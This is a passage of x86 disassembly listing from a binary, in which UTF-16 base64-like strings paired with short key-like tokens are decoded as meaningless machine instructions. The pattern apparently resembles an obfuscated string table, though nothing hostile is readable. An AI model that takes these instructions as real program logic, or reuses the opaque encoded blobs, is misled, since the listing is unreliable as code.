1000418c:	00 46 00             	add    %al,0x0(%esi)
1000418f:	59                   	pop    %ecx
10004190:	00 52 00             	add    %dl,0x0(%edx)
10004193:	45                   	inc    %ebp
10004194:	00 78 00             	add    %bh,0x0(%eax)
10004197:	6b 00 61             	imul   $0x61,(%eax),%eax
1000419a:	00 30                	add    %dh,(%eax)
1000419c:	00 49 00             	add    %cl,0x0(%ecx)
1000419f:	33 00                	xor    (%eax),%eax
100041a1:	5a                   	pop    %edx
100041a2:	00 33                	add    %dh,(%ebx)
100041a4:	00 41 00             	add    %al,0x0(%ecx)
100041a7:	7a 00                	jp     0x100041a9
100041a9:	63 00                	arpl   %eax,(%eax)
100041ab:	45                   	inc    %ebp
100041ac:	00 52 00             	add    %dl,0x0(%edx)
100041af:	4d                   	dec    %ebp
100041b0:	00 5a 00             	add    %bl,0x0(%edx)
100041b3:	47                   	inc    %edi
100041b4:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
100041b8:	00 4e 00             	add    %cl,0x0(%esi)
100041bb:	32 00                	xor    (%eax),%al
100041bd:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
100041c1:	4d                   	dec    %ebp
100041c2:	00 33                	add    %dh,(%ebx)
100041c4:	00 42 00             	add    %al,0x0(%edx)
100041c7:	4f                   	dec    %edi
100041c8:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
100041cc:	00 52 00             	add    %dl,0x0(%edx)
100041cf:	4d                   	dec    %ebp
100041d0:	00 5a 00             	add    %bl,0x0(%edx)
100041d3:	47                   	inc    %edi
100041d4:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
100041d8:	00 4e 00             	add    %cl,0x0(%esi)
100041db:	32 00                	xor    (%eax),%al
100041dd:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
100041e1:	4d                   	dec    %ebp
100041e2:	00 33                	add    %dh,(%ebx)
100041e4:	00 41 00             	add    %al,0x0(%ecx)
100041e7:	3d 00 00 15 44       	cmp    $0x44150000,%eax
100041ec:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
100041f0:	00 6b 00             	add    %ch,0x0(%ebx)
100041f3:	42                   	inc    %edx
100041f4:	00 37                	add    %dh,(%edi)
100041f6:	00 67 00             	add    %ah,0x0(%edi)
100041f9:	70 00                	jo     0x100041fb
100041fb:	33 00                	xor    (%eax),%eax
100041fd:	70 00                	jo     0x100041ff
100041ff:	00 80 b9 4f 00 57    	add    %al,0x57004fb9(%eax)
10004205:	00 4e 00             	add    %cl,0x0(%esi)
10004208:	78 00                	js     0x1000420a
1000420a:	4e                   	dec    %esi
1000420b:	00 6d 00             	add    %ch,0x0(%ebp)
1000420e:	4a                   	dec    %edx
1000420f:	00 70 00             	add    %dh,0x0(%eax)
10004212:	61                   	popa
10004213:	00 55 00             	add    %dl,0x0(%ebp)
10004216:	39 00                	cmp    %eax,(%eax)
10004218:	78 00                	js     0x1000421a
1000421a:	54                   	push   %esp
1000421b:	00 32                	add    %dh,(%edx)
1000421d:	00 46 00             	add    %al,0x0(%esi)
10004220:	58                   	pop    %eax
10004221:	00 65 00             	add    %ah,0x0(%ebp)
10004224:	44                   	inc    %esp
10004225:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
10004229:	00 63 00             	add    %ah,0x0(%ebx)
1000422c:	54                   	push   %esp
1000422d:	00 5a 00             	add    %bl,0x0(%edx)
10004230:	69 00 61 00 57 00    	imul   $0x570061,(%eax),%eax
10004236:	6c                   	insb   (%dx),%es:(%edi)
10004237:	00 50 00             	add    %dl,0x0(%eax)
1000423a:	63 00                	arpl   %eax,(%eax)
1000423c:	55                   	push   %ebp
1000423d:	00 38                	add    %bh,(%eax)
1000423f:	00 35 00 59 00 33    	add    %dh,0x33005900
10004245:	00 45 00             	add    %al,0x0(%ebp)
10004248:	32 00                	xor    (%eax),%al
1000424a:	59                   	pop    %ecx
1000424b:	00 6d 00             	add    %ch,0x0(%ebp)
1000424e:	6c                   	insb   (%dx),%es:(%edi)
1000424f:	00 70 00             	add    %dh,0x0(%eax)
10004252:	54                   	push   %esp
10004253:	00 33                	add    %dh,(%ebx)
10004255:	00 46 00             	add    %al,0x0(%esi)
10004258:	50                   	push   %eax
10004259:	00 61 00             	add    %ah,0x0(%ecx)
1000425c:	47                   	inc    %edi
1000425d:	00 4d 00             	add    %cl,0x0(%ebp)
10004260:	79 00                	jns    0x10004262
10004262:	4f                   	dec    %edi
10004263:	00 57 00             	add    %dl,0x0(%edi)
10004266:	4e                   	dec    %esi
10004267:	00 78 00             	add    %bh,0x0(%eax)
1000426a:	4e                   	dec    %esi
1000426b:	00 6d 00             	add    %ch,0x0(%ebp)
1000426e:	4a                   	dec    %edx
1000426f:	00 70 00             	add    %dh,0x0(%eax)
10004272:	61                   	popa
10004273:	00 55 00             	add    %dl,0x0(%ebp)
10004276:	39 00                	cmp    %eax,(%eax)
10004278:	78 00                	js     0x1000427a
1000427a:	54                   	push   %esp
1000427b:	00 7a 00             	add    %bh,0x0(%edx)
1000427e:	6c                   	insb   (%dx),%es:(%edi)
1000427f:	00 6a 00             	add    %ch,0x0(%edx)
10004282:	63 00                	arpl   %eax,(%eax)
10004284:	54                   	push   %esp
10004285:	00 5a 00             	add    %bl,0x0(%edx)
10004288:	69 00 61 00 57 00    	imul   $0x570061,(%eax),%eax
1000428e:	6c                   	insb   (%dx),%es:(%edi)
1000428f:	00 50 00             	add    %dl,0x0(%eax)
10004292:	63 00                	arpl   %eax,(%eax)
10004294:	55                   	push   %ebp
10004295:	00 38                	add    %bh,(%eax)
10004297:	00 77 00             	add    %dh,0x0(%edi)
1000429a:	50                   	push   %eax
1000429b:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
1000429f:	00 6a 00             	add    %ch,0x0(%edx)
100042a2:	63 00                	arpl   %eax,(%eax)
100042a4:	54                   	push   %esp
100042a5:	00 5a 00             	add    %bl,0x0(%edx)
100042a8:	69 00 61 00 57 00    	imul   $0x570061,(%eax),%eax
100042ae:	6c                   	insb   (%dx),%es:(%edi)
100042af:	00 50 00             	add    %dl,0x0(%eax)
100042b2:	63 00                	arpl   %eax,(%eax)
100042b4:	55                   	push   %ebp
100042b5:	00 38                	add    %bh,(%eax)
100042b7:	00 3d 00 00 15 39    	add    %bh,0x39150000
100042bd:	00 63 00             	add    %ah,0x0(%ebx)
100042c0:	71 00                	jno    0x100042c2
100042c2:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
100042c6:	69 00 69 00 4f 00    	imul   $0x4f0069,(%eax),%eax
100042cc:	71 00                	jno    0x100042ce
100042ce:	4f                   	dec    %edi
100042cf:	00 00                	add    %al,(%eax)
100042d1:	80 f9 61             	cmp    $0x61,%cl
100042d4:	00 6d 00             	add    %ch,0x0(%ebp)
100042d7:	39 00                	cmp    %eax,(%eax)
100042d9:	70 00                	jo     0x100042db
100042db:	62 00                	bound  %eax,(%eax)
100042dd:	57                   	push   %edi
100042de:	00 52 00             	add    %dl,0x0(%edx)
100042e1:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
100042e5:	31 00                	xor    %eax,(%eax)
100042e7:	4d                   	dec    %ebp
100042e8:	00 33                	add    %dh,(%ebx)
100042ea:	00 57 00             	add    %dl,0x0(%edi)
100042ed:	56                   	push   %esi
100042ee:	00 46 00             	add    %al,0x0(%esi)
100042f1:	59                   	pop    %ecx
100042f2:	00 51 00             	add    %dl,0x0(%ecx)
100042f5:	6d                   	insl   (%dx),%es:(%edi)
100042f6:	00 70 00             	add    %dh,0x0(%eax)
100042f9:	76 00                	jbe    0x100042fb
100042fb:	61                   	popa
100042fc:	00 57 00             	add    %dl,0x0(%edi)
100042ff:	31 00                	xor    %eax,(%eax)
10004301:	6b 00 65             	imul   $0x65,(%eax),%eax
10004304:	00 6d 00             	add    %ch,0x0(%ebp)
10004307:	74 00                	je     0x10004309
10004309:	54                   	push   %esp
1000430a:	00 4e 00             	add    %cl,0x0(%esi)
1000430d:	31 00                	xor    %eax,(%eax)
1000430f:	6c                   	insb   (%dx),%es:(%edi)
10004310:	00 71 00             	add    %dh,0x0(%ecx)
10004313:	62 00                	bound  %eax,(%eax)
10004315:	32 00                	xor    (%eax),%al
10004317:	6c                   	insb   (%dx),%es:(%edi)
10004318:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
1000431c:	00 48 00             	add    %cl,0x0(%eax)
1000431f:	70 00                	jo     0x10004321
10004321:	72 00                	jb     0x10004323
10004323:	55                   	push   %ebp
10004324:	00 7a 00             	add    %bh,0x0(%edx)
10004327:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
1000432b:	64 00 31             	add    %dh,%fs:(%ecx)
1000432e:	00 52 00             	add    %dl,0x0(%edx)
10004331:	48                   	dec    %eax
10004332:	00 61 00             	add    %ah,0x0(%ecx)
10004335:	6d                   	insl   (%dx),%es:(%edi)
10004336:	00 39                	add    %bh,(%ecx)
10004338:	00 70 00             	add    %dh,0x0(%eax)
1000433b:	62 00                	bound  %eax,(%eax)
1000433d:	57                   	push   %edi
1000433e:	00 52 00             	add    %dl,0x0(%edx)
10004341:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004345:	31 00                	xor    %eax,(%eax)
10004347:	4d                   	dec    %ebp
10004348:	00 33                	add    %dh,(%ebx)
1000434a:	00 57 00             	add    %dl,0x0(%edi)
1000434d:	57                   	push   %edi
1000434e:	00 70 00             	add    %dh,0x0(%eax)
10004351:	76 00                	jbe    0x10004353
10004353:	61                   	popa
10004354:	00 57 00             	add    %dl,0x0(%edi)
10004357:	31 00                	xor    %eax,(%eax)
10004359:	6b 00 65             	imul   $0x65,(%eax),%eax
1000435c:	00 6d 00             	add    %ch,0x0(%ebp)
1000435f:	74 00                	je     0x10004361
10004361:	54                   	push   %esp
10004362:	00 4e 00             	add    %cl,0x0(%esi)
10004365:	31 00                	xor    %eax,(%eax)
10004367:	6c                   	insb   (%dx),%es:(%edi)
10004368:	00 47 00             	add    %al,0x0(%edi)
1000436b:	4d                   	dec    %ebp
1000436c:	00 57 00             	add    %dl,0x0(%edi)
1000436f:	4a                   	dec    %edx
10004370:	00 71 00             	add    %dh,0x0(%ecx)
10004373:	62 00                	bound  %eax,(%eax)
10004375:	32 00                	xor    (%eax),%al
10004377:	6c                   	insb   (%dx),%es:(%edi)
10004378:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
1000437c:	00 48 00             	add    %cl,0x0(%eax)
1000437f:	70 00                	jo     0x10004381
10004381:	72 00                	jb     0x10004383
10004383:	55                   	push   %ebp
10004384:	00 7a 00             	add    %bh,0x0(%edx)
10004387:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
1000438b:	61                   	popa
1000438c:	00 6d 00             	add    %ch,0x0(%ebp)
1000438f:	39 00                	cmp    %eax,(%eax)
10004391:	70 00                	jo     0x10004393
10004393:	62 00                	bound  %eax,(%eax)
10004395:	57                   	push   %edi
10004396:	00 52 00             	add    %dl,0x0(%edx)
10004399:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
1000439d:	31 00                	xor    %eax,(%eax)
1000439f:	4d                   	dec    %ebp
100043a0:	00 33                	add    %dh,(%ebx)
100043a2:	00 57 00             	add    %dl,0x0(%edi)
100043a5:	57                   	push   %edi
100043a6:	00 31                	add    %dh,(%ecx)
100043a8:	00 4f 00             	add    %cl,0x0(%edi)
100043ab:	62 00                	bound  %eax,(%eax)
100043ad:	32 00                	xor    (%eax),%al
100043af:	70 00                	jo     0x100043b1
100043b1:	76 00                	jbe    0x100043b3
100043b3:	61                   	popa
100043b4:	00 57 00             	add    %dl,0x0(%edi)
100043b7:	31 00                	xor    %eax,(%eax)
100043b9:	6b 00 65             	imul   $0x65,(%eax),%eax
100043bc:	00 6d 00             	add    %ch,0x0(%ebp)
100043bf:	74 00                	je     0x100043c1
100043c1:	54                   	push   %esp
100043c2:	00 4e 00             	add    %cl,0x0(%esi)
100043c5:	31 00                	xor    %eax,(%eax)
100043c7:	6b 00 3d             	imul   $0x3d,(%eax),%eax
100043ca:	00 00                	add    %al,(%eax)
100043cc:	15 6a 00 6f 00       	adc    $0x6f006a,%eax
100043d1:	69 00 6d 00 64 00    	imul   $0x64006d,(%eax),%eax
100043d7:	7a 00                	jp     0x100043d9
100043d9:	6b 00 53             	imul   $0x53,(%eax),%eax
100043dc:	00 37                	add    %dh,(%edi)
100043de:	00 59 00             	add    %bl,0x0(%ecx)
100043e1:	00 79 54             	add    %bh,0x54(%ecx)
100043e4:	00 46 00             	add    %al,0x0(%esi)
100043e7:	55                   	push   %ebp
100043e8:	00 35 00 52 00 6b    	add    %dh,0x6b005200
100043ee:	00 4e 00             	add    %cl,0x0(%esi)
100043f1:	32 00                	xor    (%eax),%al
100043f3:	54                   	push   %esp
100043f4:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
100043f8:	00 33                	add    %dh,(%ebx)
100043fa:	00 5a 00             	add    %bl,0x0(%edx)
100043fd:	46                   	inc    %esi
100043fe:	00 6b 00             	add    %ch,0x0(%ebx)
10004401:	7a 00                	jp     0x10004403
10004403:	54                   	push   %esp
10004404:	00 6b 00             	add    %ch,0x0(%ebx)
10004407:	78 00                	js     0x10004409
10004409:	56                   	push   %esi
1000440a:	00 4f 00             	add    %cl,0x0(%edi)
1000440d:	55                   	push   %ebp
1000440e:	00 5a 00             	add    %bl,0x0(%edx)
10004411:	44                   	inc    %esp
10004412:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10004416:	00 35 00 53 00 64    	add    %dh,0x64005300
1000441c:	00 32                	add    %dh,(%edx)
1000441e:	00 52 00             	add    %dl,0x0(%edx)
10004421:	4d                   	dec    %ebp
10004422:	00 56 00             	add    %dl,0x0(%esi)
10004425:	54                   	push   %esp
10004426:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
1000442a:	00 51 00             	add    %dl,0x0(%ecx)
1000442d:	33 00                	xor    (%eax),%eax
1000442f:	5a                   	pop    %edx
10004430:	00 4f 00             	add    %cl,0x0(%edi)
10004433:	55                   	push   %ebp
10004434:	00 6e 00             	add    %ch,0x0(%esi)
10004437:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
1000443b:	61                   	popa
1000443c:	00 6b 00             	add    %ch,0x0(%ebx)
1000443f:	78 00                	js     0x10004441
10004441:	56                   	push   %esi
10004442:	00 4f 00             	add    %cl,0x0(%edi)
10004445:	55                   	push   %ebp
10004446:	00 5a 00             	add    %bl,0x0(%edx)
10004449:	44                   	inc    %esp
1000444a:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
1000444e:	00 35 00 53 00 64    	add    %dh,0x64005300
10004454:	00 32                	add    %dh,(%edx)
10004456:	00 51 00             	add    %dl,0x0(%ecx)
10004459:	3d 00 00 15 4c       	cmp    $0x4c150000,%eax
1000445e:	00 55 00             	add    %dl,0x0(%ebp)
10004461:	39 00                	cmp    %eax,(%eax)
10004463:	46                   	inc    %esi
10004464:	00 43 00             	add    %al,0x0(%ebx)
10004467:	76 00                	jbe    0x10004469
10004469:	4e                   	dec    %esi
1000446a:	00 52 00             	add    %dl,0x0(%edx)
1000446d:	77 00                	ja     0x1000446f
1000446f:	64 00 00             	add    %al,%fs:(%eax)
10004472:	81 71 61 00 6d 00 39 	xorl   $0x39006d00,0x61(%ecx)
10004479:	00 50 00             	add    %dl,0x0(%eax)
1000447c:	4e                   	dec    %esi
1000447d:	00 55 00             	add    %dl,0x0(%ebp)
10004480:	35 00 35 00 65       	xor    $0x65003500,%eax
10004485:	00 6d 00             	add    %ch,0x0(%ebp)
10004488:	74 00                	je     0x1000448a
1000448a:	31 00                	xor    %eax,(%eax)
1000448c:	56                   	push   %esi
1000448d:	00 56 00             	add    %dl,0x0(%esi)
10004490:	4e                   	dec    %esi
10004491:	00 58 00             	add    %bl,0x0(%eax)
10004494:	4e                   	dec    %esi
10004495:	00 57 00             	add    %dl,0x0(%edi)
10004498:	70 00                	jo     0x1000449a
1000449a:	76 00                	jbe    0x1000449c
1000449c:	54                   	push   %esp
1000449d:	00 7a 00             	add    %bh,0x0(%edx)
100044a0:	56                   	push   %esi
100044a1:	00 4f 00             	add    %cl,0x0(%edi)
100044a4:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
100044a8:	70 00                	jo     0x100044aa
100044aa:	72 00                	jb     0x100044ac
100044ac:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
100044b0:	56                   	push   %esi
100044b1:	00 71 00             	add    %dh,0x0(%ecx)
100044b4:	62 00                	bound  %eax,(%eax)
100044b6:	30 00                	xor    %al,(%eax)
100044b8:	38 00                	cmp    %al,(%eax)
100044ba:	31 00                	xor    %eax,(%eax)
100044bc:	54                   	push   %esp
100044bd:	00 6e 00             	add    %ch,0x0(%esi)
100044c0:	6c                   	insb   (%dx),%es:(%edi)
100044c1:	00 36                	add    %dh,(%esi)
100044c3:	00 61 00             	add    %ah,0x0(%ecx)
100044c6:	33 00                	xor    (%eax),%eax
100044c8:	56                   	push   %esi
100044c9:	00 56 00             	add    %dl,0x0(%esi)
100044cc:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100044d0:	52                   	push   %edx
100044d1:	00 48 00             	add    %cl,0x0(%eax)
100044d4:	61                   	popa
100044d5:	00 6d 00             	add    %ch,0x0(%ebp)
100044d8:	39 00                	cmp    %eax,(%eax)
100044da:	50                   	push   %eax
100044db:	00 4e 00             	add    %cl,0x0(%esi)
100044de:	55                   	push   %ebp
100044df:	00 35 00 35 00 65    	add    %dh,0x65003500
100044e5:	00 6d 00             	add    %ch,0x0(%ebp)
100044e8:	74 00                	je     0x100044ea
100044ea:	31 00                	xor    %eax,(%eax)
100044ec:	56                   	push   %esi
100044ed:	00 57 00             	add    %dl,0x0(%edi)
100044f0:	70 00                	jo     0x100044f2
100044f2:	76 00                	jbe    0x100044f4
100044f4:	54                   	push   %esp
100044f5:	00 7a 00             	add    %bh,0x0(%edx)
100044f8:	56                   	push   %esi
100044f9:	00 4f 00             	add    %cl,0x0(%edi)
100044fc:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
10004500:	70 00                	jo     0x10004502
10004502:	72 00                	jb     0x10004504
10004504:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004508:	56                   	push   %esi
10004509:	00 47 00             	add    %al,0x0(%edi)
1000450c:	63 00                	arpl   %eax,(%eax)
1000450e:	32 00                	xor    (%eax),%al
10004510:	4a                   	dec    %edx
10004511:	00 71 00             	add    %dh,0x0(%ecx)
10004514:	62 00                	bound  %eax,(%eax)
10004516:	30 00                	xor    %al,(%eax)
10004518:	38 00                	cmp    %al,(%eax)
1000451a:	31 00                	xor    %eax,(%eax)
1000451c:	54                   	push   %esp
1000451d:	00 6e 00             	add    %ch,0x0(%esi)
10004520:	6c                   	insb   (%dx),%es:(%edi)
10004521:	00 36                	add    %dh,(%esi)
10004523:	00 61 00             	add    %ah,0x0(%ecx)
10004526:	33 00                	xor    (%eax),%eax
10004528:	56                   	push   %esi
10004529:	00 56 00             	add    %dl,0x0(%esi)
1000452c:	61                   	popa
1000452d:	00 6d 00             	add    %ch,0x0(%ebp)
10004530:	39 00                	cmp    %eax,(%eax)
10004532:	50                   	push   %eax
10004533:	00 4e 00             	add    %cl,0x0(%esi)
10004536:	55                   	push   %ebp
10004537:	00 35 00 35 00 65    	add    %dh,0x65003500
1000453d:	00 6d 00             	add    %ch,0x0(%ebp)
10004540:	74 00                	je     0x10004542
10004542:	31 00                	xor    %eax,(%eax)
10004544:	56                   	push   %esi
10004545:	00 55 00             	add    %dl,0x0(%ebp)
10004548:	5a                   	pop    %edx
10004549:	00 57 00             	add    %dl,0x0(%edi)
1000454c:	4d                   	dec    %ebp
1000454d:	00 47 00             	add    %al,0x0(%edi)
10004550:	70 00                	jo     0x10004552
10004552:	76 00                	jbe    0x10004554
10004554:	54                   	push   %esp
10004555:	00 7a 00             	add    %bh,0x0(%edx)
10004558:	56                   	push   %esi
10004559:	00 4f 00             	add    %cl,0x0(%edi)
1000455c:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
10004560:	70 00                	jo     0x10004562
10004562:	72 00                	jb     0x10004564
10004564:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004568:	56                   	push   %esi
10004569:	00 71 00             	add    %dh,0x0(%ecx)
1000456c:	62 00                	bound  %eax,(%eax)
1000456e:	30 00                	xor    %al,(%eax)
10004570:	38 00                	cmp    %al,(%eax)
10004572:	31 00                	xor    %eax,(%eax)
10004574:	54                   	push   %esp
10004575:	00 6e 00             	add    %ch,0x0(%esi)
10004578:	6c                   	insb   (%dx),%es:(%edi)
10004579:	00 36                	add    %dh,(%esi)
1000457b:	00 61 00             	add    %ah,0x0(%ecx)
1000457e:	33 00                	xor    (%eax),%eax
10004580:	56                   	push   %esi
10004581:	00 56 00             	add    %dl,0x0(%esi)
10004584:	59                   	pop    %ecx
10004585:	00 56 00             	add    %dl,0x0(%esi)
10004588:	64 00 33             	add    %dh,%fs:(%ebx)
1000458b:	00 61 00             	add    %ah,0x0(%ecx)
1000458e:	6d                   	insl   (%dx),%es:(%edi)
1000458f:	00 39                	add    %bh,(%ecx)
10004591:	00 50 00             	add    %dl,0x0(%eax)
10004594:	4e                   	dec    %esi
10004595:	00 55 00             	add    %dl,0x0(%ebp)
10004598:	35 00 35 00 65       	xor    $0x65003500,%eax
1000459d:	00 6d 00             	add    %ch,0x0(%ebp)
100045a0:	74 00                	je     0x100045a2
100045a2:	31 00                	xor    %eax,(%eax)
100045a4:	56                   	push   %esi
100045a5:	00 57 00             	add    %dl,0x0(%edi)
100045a8:	70 00                	jo     0x100045aa
100045aa:	76 00                	jbe    0x100045ac
100045ac:	54                   	push   %esp
100045ad:	00 7a 00             	add    %bh,0x0(%edx)
100045b0:	56                   	push   %esi
100045b1:	00 4f 00             	add    %cl,0x0(%edi)
100045b4:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
100045b8:	70 00                	jo     0x100045ba
100045ba:	72 00                	jb     0x100045bc
100045bc:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
100045c0:	55                   	push   %ebp
100045c1:	00 39                	add    %bh,(%ecx)
100045c3:	00 61 00             	add    %ah,0x0(%ecx)
100045c6:	6d                   	insl   (%dx),%es:(%edi)
100045c7:	00 39                	add    %bh,(%ecx)
100045c9:	00 50 00             	add    %dl,0x0(%eax)
100045cc:	4e                   	dec    %esi
100045cd:	00 55 00             	add    %dl,0x0(%ebp)
100045d0:	35 00 35 00 65       	xor    $0x65003500,%eax
100045d5:	00 6d 00             	add    %ch,0x0(%ebp)
100045d8:	74 00                	je     0x100045da
100045da:	31 00                	xor    %eax,(%eax)
100045dc:	56                   	push   %esi
100045dd:	00 51 00             	add    %dl,0x0(%ecx)
100045e0:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100045e5:	15 6a 00 6f 00       	adc    $0x6f006a,%eax
100045ea:	4f                   	dec    %edi
100045eb:	00 35 00 4e 00 79    	add    %dh,0x79004e00
100045f1:	00 7a 00             	add    %bh,0x0(%edx)
100045f4:	6b 00 75             	imul   $0x75,(%eax),%eax
100045f7:	00 55 00             	add    %dl,0x0(%ebp)
100045fa:	00 80 f9 52 00 30    	add    %al,0x300052f9(%eax)
10004600:	00 4a 00             	add    %cl,0x0(%edx)
10004603:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004607:	58                   	pop    %eax
10004608:	00 5a 00             	add    %bl,0x0(%edx)
1000460b:	44                   	inc    %esp
1000460c:	00 59 00             	add    %bl,0x0(%ecx)
1000460f:	32 00                	xor    (%eax),%al
10004611:	4e                   	dec    %esi
10004612:	00 6f 00             	add    %ch,0x0(%edi)
10004615:	64 00 32             	add    %dh,%fs:(%edx)
10004618:	00 4a 00             	add    %cl,0x0(%edx)
1000461b:	74 00                	je     0x1000461d
1000461d:	5a                   	pop    %edx
1000461e:	00 45 00             	add    %al,0x0(%ebp)
10004621:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
10004625:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004629:	6c                   	insb   (%dx),%es:(%edi)
1000462a:	00 32                	add    %dh,(%edx)
1000462c:	00 51 00             	add    %dl,0x0(%ecx)
1000462f:	32 00                	xor    (%eax),%al
10004631:	4e                   	dec    %esi
10004632:	00 6a 00             	add    %ch,0x0(%edx)
10004635:	61                   	popa
10004636:	00 48 00             	add    %cl,0x0(%eax)
10004639:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
1000463d:	51                   	push   %ecx
1000463e:	00 6e 00             	add    %ch,0x0(%esi)
10004641:	70 00                	jo     0x10004643
10004643:	70 00                	jo     0x10004645
10004645:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10004649:	4e                   	dec    %esi
1000464a:	00 6a 00             	add    %ch,0x0(%edx)
1000464d:	59                   	pop    %ecx
1000464e:	00 32                	add    %dh,(%edx)
10004650:	00 68 00             	add    %ch,0x0(%eax)
10004653:	33 00                	xor    (%eax),%eax
10004655:	62 00                	bound  %eax,(%eax)
10004657:	47                   	inc    %edi
10004658:	00 4a 00             	add    %cl,0x0(%edx)
1000465b:	75 00                	jne    0x1000465d
1000465d:	52                   	push   %edx
1000465e:	00 30                	add    %dh,(%eax)
10004660:	00 4a 00             	add    %cl,0x0(%edx)
10004663:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004667:	58                   	pop    %eax
10004668:	00 5a 00             	add    %bl,0x0(%edx)
1000466b:	44                   	inc    %esp
1000466c:	00 59 00             	add    %bl,0x0(%ecx)
1000466f:	32 00                	xor    (%eax),%al
10004671:	4e                   	dec    %esi
10004672:	00 6f 00             	add    %ch,0x0(%edi)
10004675:	64 00 30             	add    %dh,%fs:(%eax)
10004678:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
1000467c:	00 65 00             	add    %ah,0x0(%ebp)
1000467f:	6d                   	insl   (%dx),%es:(%edi)
10004680:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
10004684:	00 51 00             	add    %dl,0x0(%ecx)
10004687:	32 00                	xor    (%eax),%al
10004689:	4e                   	dec    %esi
1000468a:	00 6a 00             	add    %ch,0x0(%edx)
1000468d:	61                   	popa
1000468e:	00 48 00             	add    %cl,0x0(%eax)
10004691:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
10004695:	61                   	popa
10004696:	00 47 00             	add    %al,0x0(%edi)
10004699:	4e                   	dec    %esi
1000469a:	00 48 00             	add    %cl,0x0(%eax)
1000469d:	51                   	push   %ecx
1000469e:	00 6e 00             	add    %ch,0x0(%esi)
100046a1:	70 00                	jo     0x100046a3
100046a3:	70 00                	jo     0x100046a5
100046a5:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
100046a9:	4e                   	dec    %esi
100046aa:	00 6a 00             	add    %ch,0x0(%edx)
100046ad:	59                   	pop    %ecx
100046ae:	00 32                	add    %dh,(%edx)
100046b0:	00 68 00             	add    %ch,0x0(%eax)
100046b3:	33 00                	xor    (%eax),%eax
100046b5:	52                   	push   %edx
100046b6:	00 30                	add    %dh,(%eax)
100046b8:	00 4a 00             	add    %cl,0x0(%edx)
100046bb:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
100046bf:	58                   	pop    %eax
100046c0:	00 5a 00             	add    %bl,0x0(%edx)
100046c3:	44                   	inc    %esp
100046c4:	00 59 00             	add    %bl,0x0(%ecx)
100046c7:	32 00                	xor    (%eax),%al
100046c9:	4e                   	dec    %esi
100046ca:	00 6f 00             	add    %ch,0x0(%edi)
100046cd:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
100046d1:	4a                   	dec    %edx
100046d2:	00 7a 00             	add    %bh,0x0(%edx)
100046d5:	50                   	push   %eax
100046d6:	00 55 00             	add    %dl,0x0(%ebp)
100046d9:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
100046dd:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100046e1:	6c                   	insb   (%dx),%es:(%edi)
100046e2:	00 32                	add    %dh,(%edx)
100046e4:	00 51 00             	add    %dl,0x0(%ecx)
100046e7:	32 00                	xor    (%eax),%al
100046e9:	4e                   	dec    %esi
100046ea:	00 6a 00             	add    %ch,0x0(%edx)
100046ed:	61                   	popa
100046ee:	00 48 00             	add    %cl,0x0(%eax)
100046f1:	63 00                	arpl   %eax,(%eax)
100046f3:	3d 00 00 15 47       	cmp    $0x47150000,%eax
100046f8:	00 42 00             	add    %al,0x0(%edx)
100046fb:	7a 00                	jp     0x100046fd
100046fd:	69 00 76 00 43 00    	imul   $0x430076,(%eax),%eax
10004703:	63 00                	arpl   %eax,(%eax)
10004705:	63 00                	arpl   %eax,(%eax)
10004707:	68 00 77 00 00       	push   $0x7700
1000470c:	85 81 55 00 47 00    	test   %eax,0x470055(%ecx)
10004712:	77 00                	ja     0x10004714
10004714:	30 00                	xor    %al,(%eax)
10004716:	56                   	push   %esi
10004717:	00 33                	add    %dh,(%ebx)
10004719:	00 4a 00             	add    %cl,0x0(%edx)
1000471c:	4d                   	dec    %ebp
1000471d:	00 53 00             	add    %dl,0x0(%ebx)
10004720:	31 00                	xor    %eax,(%eax)
10004722:	4e                   	dec    %esi
10004723:	00 61 00             	add    %ah,0x0(%ecx)
10004726:	59                   	pop    %ecx
10004727:	00 31                	add    %dh,(%ecx)
10004729:	00 46 00             	add    %al,0x0(%esi)
1000472c:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
10004730:	46                   	inc    %esi
10004731:	00 42 00             	add    %al,0x0(%edx)
10004734:	73 00                	jae    0x10004736
10004736:	4e                   	dec    %esi
10004737:	00 46 00             	add    %al,0x0(%esi)
